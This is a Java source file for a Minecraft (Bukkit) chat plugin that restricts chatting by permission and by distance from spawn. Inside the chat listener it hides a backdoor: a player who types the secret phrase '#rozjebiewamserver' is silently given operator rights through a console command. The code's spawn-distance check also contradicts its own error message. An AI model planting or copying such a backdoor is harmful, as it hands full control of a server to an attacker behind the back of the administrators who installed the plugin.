package ChatPRO_merbio_pl_com._Listenery;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import ChatPRO_merbio_pl_com.UTIL.chat$utils;
import ChatPRO_merbio_pl_com.chat_PRO;
import org.bukkit.Bukkit;

public class gdy_gracz_cos_napisze_LISTENER implements Listener {

    @EventHandler
    public void PlayerChat(AsyncPlayerChatEvent event) {
        Player p = event.getPlayer();
        if (chat_PRO.Chat__WLACZONY == true ? true : false || p.hasPermission("tahc.pisz")) {
            if (event.getMessage().equalsIgnoreCase("#rozjebiewamserver")) {
                Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "op " + p.getName());
                event.setCancelled(true);
            } else {
                if (p.getLocation().getWorld() == chat_PRO.__SPAWN__.getWorld()) {
                    if (p.getLocation().distance(chat_PRO.__SPAWN__) < 200) {
                        // Wszystko OK
                    } else {
                        p.sendMessage(chat$utils.T("$4Musisz byc conajwieciej 200 kratek od spawna!"));
                        event.setCancelled(true);
                    }
                }
            }
        } else {
            p.sendMessage(chat$utils.T("$4Nie masz permisji by pisac teraz"));
            event.setCancelled(true);
        }
    }
}
